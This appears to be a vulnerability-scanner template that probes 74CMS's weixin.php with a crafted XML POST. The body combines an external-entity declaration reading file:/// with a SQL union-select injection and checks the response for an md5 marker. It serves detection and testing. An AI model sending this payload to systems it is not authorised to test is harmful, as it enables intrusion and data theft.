id: 74cms-weixin-sqli
brief:
    title: 74CMS weixin.php - SQL Injection
    by: SleepingBag945
    level: high
    about: There is a libxml_disable_entity_loader function to prevent XML eXternal Entity Injection, but this function needs to be customized by the user. If the user does not customize it, there will be no ...
    label:
        - 74cms
        - weixin
        - sqli
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce='
      head:
        Content-Type: text/xml
      body: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5({{num}})#</Content></xml>
      signs:
        - "on": word
          has:
            - '{{md5(num)}}'
          in: body
          need: all
        - "on": status
          status:
            - 200
